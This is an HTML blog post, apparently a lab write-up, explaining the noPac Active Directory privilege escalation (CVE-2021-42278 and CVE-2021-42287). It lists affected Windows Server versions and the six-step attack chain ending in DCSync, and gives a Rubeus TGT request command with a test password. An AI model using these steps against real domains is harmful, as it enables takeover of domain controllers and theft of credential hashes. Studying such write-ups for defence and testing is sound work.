@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>nopac复现 | Hexo</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="nopac复现 | Hexo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nopac复现">
+<meta property="og:url" content="http://example.com/2023/07/13/nopac%E5%A4%8D%E7%8E%B0-1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-12T16:27:04.000Z">
+<meta property="article:modified_time" content="2023-07-12T16:27:04.171Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>John Doe</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="facebook"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-facebook"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="instagram"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-instagram"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/yelog/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="weibo"
+               href="http://weibo.com/u/2307534817"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-weibo"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="jianshu"
+               href="https://www.jianshu.com/u/ff56736de7cf"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-jianshu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="zhihu"
+               href="https://www.zhihu.com/people/jaytp/activities"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-zhihu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="oschina"
+               href="https://my.oschina.net/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-oschina"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="email"
+               href="mailto:jaytp@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=872336115&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="kugou"
+               href="https://www.kugou.com/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-kugou"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=88151013"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(8)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="内网渗透">
+                        
+                        内网渗透
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="域渗透">
+                        
+                        域渗透
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="c++">
+                        
+                        c++
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="java">
+                        
+                        java
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="8">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All "
+           href="/2023/07/13/nopac%E5%A4%8D%E7%8E%B0-1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="nopac复现">nopac复现</span>
+            <span class="post-date" title="2023-07-13 00:27:04">2023/07/13</span>
+        </a>
+        
+        <a  class="All 域渗透 "
+           href="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="nopac复现">nopac复现</span>
+            <span class="post-date" title="2023-07-12 23:25:09">2023/07/12</span>
+        </a>
+        
+        <a  class="All 域渗透 "
+           href="/2023/07/12/%E5%9F%9F%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="域密码喷洒">域密码喷洒</span>
+            <span class="post-date" title="2023-07-12 22:17:27">2023/07/12</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2023/03/19/dll-%E4%BB%A3%E7%90%86%E5%8A%AB%E6%8C%81/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="dll 代理劫持">dll 代理劫持</span>
+            <span class="post-date" title="2023-03-19 11:06:30">2023/03/19</span>
+        </a>
+        
+        <a  class="All c++ "
+           href="/2023/03/09/rsa-%E7%AE%97%E6%B3%95/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="rsa 算法">rsa 算法</span>
+            <span class="post-date" title="2023-03-09 20:45:27">2023/03/09</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2023/03/05/%E5%BC%80%E5%90%AF3389/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="3389相关">3389相关</span>
+            <span class="post-date" title="2023-03-05 23:08:48">2023/03/05</span>
+        </a>
+        
+        <a  class="All java "
+           href="/2023/02/24/java-%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="java 反射学习">java 反射学习</span>
+            <span class="post-date" title="2023-02-24 22:01:44">2023/02/24</span>
+        </a>
+        
+        <a  class="All java "
+           href="/2023/02/18/java-%E7%B3%BB%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E7%B3%BB%E5%88%97%E5%8C%96/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="java 系列化与反系列化">java 系列化与反系列化</span>
+            <span class="post-date" title="2023-02-18 22:30:12">2023/02/18</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-nopac复现" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">nopac复现</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="域渗透">域渗透</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-07-13 00:27:00'>2023-07-12 23:25</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%97%AE%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AFsAMAccountName%EF%BC%9F"><span class="toc-text">第一问：什么是sAMAccountName？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%97%AE%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E9%87%8C%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E6%9C%BA%E5%99%A8%E8%B4%A6%E5%8F%B7%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%EF%BC%9F"><span class="toc-text">第二问：为什么这里需要一个机器账号，而不是一个普通域用户？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%97%AE%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%B8%85%E9%99%A4%E6%9C%BA%E5%99%A8%E8%B4%A6%E5%8F%B7%E7%9A%84spn"><span class="toc-text">第三问：为什么要清除机器账号的spn?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%97%AE%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BF%AE%E6%94%B9%E5%88%9B%E5%BB%BA%E7%9A%84%E6%9C%BA%E5%99%A8%E8%B4%A6%E5%8F%B7%E7%9A%84sAMAccountName%E6%97%B6%E4%B8%8D%E8%83%BD%E5%8A%A0-%E7%AC%A6%E5%8F%B7%E5%91%A2%EF%BC%9F"><span class="toc-text">第四问：为什么修改创建的机器账号的sAMAccountName时不能加$符号呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%97%AE%EF%BC%9A%E4%BD%A0%E8%BF%99%E4%B9%88%E6%94%B9%EF%BC%8C%E5%9F%9F%E6%8E%A7%E4%BB%96%E8%80%81%E4%BA%BA%E5%AE%B6%E4%BC%9A%E6%84%BF%E6%84%8F%E5%90%97%EF%BC%9F%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E9%99%90%E5%88%B6%EF%BC%9F"><span class="toc-text">第五问：你这么改，域控他老人家会愿意吗？有没有什么限制？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E9%97%AE%EF%BC%9A%E7%94%B3%E8%AF%B7%E7%9A%84TGT%E6%98%AF%E4%B8%8D%E6%98%AFDC%E7%9A%84%E5%91%A2%EF%BC%9F"><span class="toc-text">第六问：申请的TGT是不是DC的呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E9%97%AE%EF%BC%9A%E5%BD%93KDC%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E7%9A%84S4U%E8%AF%B7%E6%B1%82%E6%97%B6%EF%BC%8C%E6%80%8E%E4%B9%88%E4%B8%8D%E9%AA%8C%E8%AF%81%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%88%96%E8%80%85%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E5%91%A2%EF%BC%9F"><span class="toc-text">第七问：当KDC验证用户提交的S4U请求时，怎么不验证账号密码或者用户权限呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E9%97%AE%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%AC%E8%BF%99%E9%87%8C%E8%A6%81%E6%98%AF%E6%9C%89S4U2Self%E6%9D%A5%E8%AF%B7%E6%B1%82%E5%91%A2%EF%BC%9F"><span class="toc-text">第八问：为什么我们这里要是有S4U2Self来请求呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E9%97%AE%EF%BC%9A%E5%A6%82%E6%9E%9C%E8%BF%9B%E5%85%A5%E5%9F%9F%E5%86%85%E5%8F%91%E7%8E%B0MAQ%E7%AD%89%E4%BA%8E0%EF%BC%8C%E6%88%91%E4%BB%AC%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%E5%91%A2%EF%BC%9F"><span class="toc-text">第九问：如果进入域内发现MAQ等于0，我们该怎么办呢？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">三、漏洞利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-text">远程扫描：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#crackmapexec"><span class="toc-text">crackmapexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nopac-py%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F"><span class="toc-text">使用nopac.py进行扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8noPac-exe%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F"><span class="toc-text">使用noPac.exe进行扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">Linux下利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7sam-the-admin%E4%B8%80%E6%9D%A1%E9%BE%99%EF%BC%9A"><span class="toc-text">使用工具sam-the-admin一条龙：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A9%E8%9B%8B%EF%BC%9A"><span class="toc-text">彩蛋：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E4%B8%8B%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">Windows下利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dcsyc"><span class="toc-text">dcsyc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cifs"><span class="toc-text">cifs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-text">添加域管理员</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-text">四、漏洞防御：</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>CVE-2021-42287:</p>
+<p>Windows Server 2012 R2 (Server Core installation)</p>
+<p>Windows Server 2012 R2</p>
+<p>Windows Server 2012 (Server Core installation)</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</p>
+<p>Windows Server 2012</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2</p>
+<p>Windows Server 2016 (Server Core installation)</p>
+<p>Windows Server 2016</p>
+<p>Windows Server, version 20H2 (Server Core Installation)</p>
+<p>Windows Server, version 2004 (Server Core installation)</p>
+<p>Windows Server 2022 (Server Core installation)</p>
+<p>Windows Server 2022</p>
+<p>Windows Server 2019 (Server Core installation)</p>
+<p>Windows Server 2019</p>
+<p>CVE-2021-42278:</p>
+<p>Windows Server 2012 R2</p>
+<p>Windows Server 2012 (Server Core installation)</p>
+<p>Windows Server 2012</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2</p>
+<p>Windows Server 2016 (Server Core installation)</p>
+<p>Windows Server 2016</p>
+<p>Windows Server, version 20H2 (Server Core Installation)</p>
+<p>Windows Server, version 2004 (Server Core installation)</p>
+<p>Windows Server 2022 (Server Core installation)</p>
+<p>Windows Server 2019 (Server Core installation)</p>
+<p>Windows Server 2022</p>
+<p>Windows Server 2019</p>
+<p>Windows Server 2012 R2 (Server Core installation)</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在2021年11月份，Microsoft发布了两个域内提权漏洞CVE-2021-42287和CVE-2021-42278，但因为POC未公开，也没有引发关注，后来12月份这两个漏洞的利用方式被一一放出，引发了很多windows域安全研究者的关注，这两个漏洞可以进行组合攻击，在获取到域内普通用户权限的情况下模拟成域控机器账号，从而拿到域控权限。</p>
+<p>首先先利用了CVE-2021-42278 漏洞解决了一个安全绕过漏洞，这个漏洞可以允许攻击者使用计算机账号 sAMAccountName来欺骗冒充域控，CVE-2021-42287漏洞则是解决了Kerberos特权属性证书(PAC)，并且有个逻辑漏洞会在查找不到用户时在其sAMAccountName后加入$继续查询，从而到导致攻击者可以成功利用并且模拟域控从而达到提权的目的。</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>看标题大家也知道，这里是一个问为什么的课堂，为什么要这么做？其他做法行不行呢？这次我把攻击流程整理起来，来一起问一下为什么要这么做？从而去了解这个漏洞的原理：</p>
+<p>根据挖掘这个漏洞作者的文章我整理了一下其攻击流程：</p>
+<p>1、创建机器账号，清除该机器的servicePrincipalName</p>
+<p>2、将创建的机器账号的sAMAccountName更改为域控的主机名，注意后面不带$符号—-&gt;CVE-2021-42278</p>
+<p>3、为创建的机器账号申请TGT</p>
+<p>4、修改创建的机器账号的sAMAccountName为其原先的值(随便命名均可)</p>
+<p>5、使用之前获取到的TGT向域控发起S4U2Self请求服务票据—-&gt;CVE-2021-42287</p>
+<p>6、使用获取到的票据访问到域控主机，后续便可以DCSync获取到域内hash。</p>
+<h3 id="第一问：什么是sAMAccountName？"><a href="#第一问：什么是sAMAccountName？" class="headerlink" title="第一问：什么是sAMAccountName？"></a>第一问：什么是sAMAccountName？</h3><p>听这个漏洞的名字，我们就可以得知是sAMAccountName欺骗，那么先了解一下什么是sAMAccountName：</p>
+<p>在Active Directory 域中每一个用户即是一个对象，每个对象都具有各种各样的属性，其中就包括姓名，创建时间，邮箱地址等关于这个用户的信息，而每个域用户的用户名对应的属性值便为userPrincipalName 和 sAMAccountName 。那为什么是两个呢？因为在Windows 2000之前使用的用户名是sAMAccountName，则在Windows 2000之后出现了新的属性UserPrincipalName(缩写UPN)，它也可以用来登陆到AD域主机上，这两个现在都可以作为登陆用户名使用。我们可以连接ldap进行查看域用户haha的sAMAccountName值为haha，平时常使用域名\用户名的格式，UserPrincipalName值为<a href="mailto:&#x68;&#x61;&#x68;&#97;&#64;&#116;&#x65;&#x73;&#x74;&#46;&#99;&#111;&#x6d;">&#x68;&#x61;&#x68;&#97;&#64;&#116;&#x65;&#x73;&#x74;&#46;&#99;&#111;&#x6d;</a>为用户名@域名的格式。<br><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234657375.png" alt="image-20230712234657375"><br>根据挖掘这个漏洞作者的思路来说：首先我们需要创建一个机器账号，默认情况下普通域用户可以创建10个域机器账号，对应的是域内MachineAccountQuota (MAQ) 属性。<br>get-addomain | select -exp DistinguishedName | get-adobject -prop ‘ms-DS-MachineAccountQuota’ | select -exp ms-DS-MachineAccountQuota<br><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234711842.png" alt="image-20230712234711842"></p>
+<p>那么便有了新的问题：</p>
+<h3 id="第二问：为什么这里需要一个机器账号，而不是一个普通域用户？"><a href="#第二问：为什么这里需要一个机器账号，而不是一个普通域用户？" class="headerlink" title="第二问：为什么这里需要一个机器账号，而不是一个普通域用户？"></a>第二问：为什么这里需要一个机器账号，而不是一个普通域用户？</h3><p>这里我理解的是因为我们手动创建了域机器账号，便对该机器账号有WriteProperty权限</p>
+<p><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234834668.png" alt="image-20230712234834668"></p>
+<p>那么便可以操作修改该机器账号的sAMAccountName，从而达到欺骗域控的目的。如果是普通用户行不行呢？答案还是不行的，原因在这个大佬写的文章中从XP源码泄露看NoPac漏洞<br>在攻击流程的第一步后半段写的是要清除机器账号的spn，那么第三个问题来了</p>
+<h3 id="第三问：为什么要清除机器账号的spn"><a href="#第三问：为什么要清除机器账号的spn" class="headerlink" title="第三问：为什么要清除机器账号的spn?"></a>第三问：为什么要清除机器账号的spn?</h3><p>首先我们要知道，当机器账号创建时便默认携带了spn，具体可以通过连接LDAP服务进行查看<br><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234757065.png" alt="image-20230712234757065"></p>
+<p>而默认在域内只有机器账户或者域管账户才有权限注册SPN。</p>
+<p>回到我们的问题：为什么要清理创建的机器账号的spn?</p>
+<p>原因在于如果修改了 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 这其中的一个，那么SPN将会使用新值替换，要是修改了samAccountName为域控的主机名，那么其SPN将会变成域控的SPN，便会导致后续的S4U请求异常，故要清除掉默认的SPN。</p>
+<p>第二步说要修改创建的机器账号的sAMAccountName更改为域控的主机名，注意这里不加$，那么第四个问题便油然而生：</p>
+<h3 id="第四问：为什么修改创建的机器账号的sAMAccountName时不能加-符号呢？"><a href="#第四问：为什么修改创建的机器账号的sAMAccountName时不能加-符号呢？" class="headerlink" title="第四问：为什么修改创建的机器账号的sAMAccountName时不能加$符号呢？"></a>第四问：为什么修改创建的机器账号的sAMAccountName时不能加$符号呢？</h3><p>我们都知道在域内区别域用户和域机器账号，其sAMAccountName最大的区别在于最后是否有$，有$为机器账号，没有则为域用户<br>haha用户的sAMAccountName：<br><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234857617.png" alt="image-20230712234857617"></p>
+<p>win2008机器账户的sAMAccountName：<br><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234908202.png" alt="image-20230712234908202"><br>这里就涉及到CVE-2021-42287漏洞了，后面有讲</p>
+<p>那如果创建了个机器账号，然后将其sAMAccountName修改为域控的主机名，后面不带$，那么这里就有了新的问题：</p>
+<h3 id="第五问：你这么改，域控他老人家会愿意吗？有没有什么限制？"><a href="#第五问：你这么改，域控他老人家会愿意吗？有没有什么限制？" class="headerlink" title="第五问：你这么改，域控他老人家会愿意吗？有没有什么限制？"></a>第五问：你这么改，域控他老人家会愿意吗？有没有什么限制？</h3><p>说实话还真没限制，因为域用户对其创建的域机器账号有写权限，便可以修改其为任意值，只要满足sAMAccountName的格式就行，并且KDC那边没有限制，所以这里便有了CVE-2021-42278漏洞，可以通过实践来证明：<br><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234925816.png" alt="image-20230712234925816"><br>接下来便可以使用创建的机器账号申请Kerberos TGT<br>这里又有了个问题：当我们把目标机器账号的sAMAccountName修改为DC的主机名之后，那么这里申请的TGT会不会是DC的TGT呢？</p>
+<h3 id="第六问：申请的TGT是不是DC的呢？"><a href="#第六问：申请的TGT是不是DC的呢？" class="headerlink" title="第六问：申请的TGT是不是DC的呢？"></a>第六问：申请的TGT是不是DC的呢？</h3><p>这个问题就很简单了，那答案肯定就不是的呢，域控只会将该机器账号生成一个专属于该机器账号的TGT<br>操作命令为：<br>.\Rubeus.exe asktgt /user:”DC” /password:”www123456#” /domain:”test.com” /dc:”dc.test.com” /nowrap<br><img src="/2023/07/12/nopac%E5%A4%8D%E7%8E%B0/.%5Cimages%5Cimage-20230712234943531.png" alt="image-20230712234943531"></p>
+<p>由此可证明该TGT为机器账号的TGT并非域控DC的<br><img src="./images/image-20230712234955974.png" alt="image-20230712234955974"></p>
+<p>那么问题又来了，这个漏洞其实作用不大，只是改了机器账号的sAMAccountName值域控的主机名，申请到的还是自己的TGT，那就可以低危收场了。但接下来由于配合了CVE-2021-42287漏洞，从而将漏洞等级直线提升，接下来慢慢讲。</p>
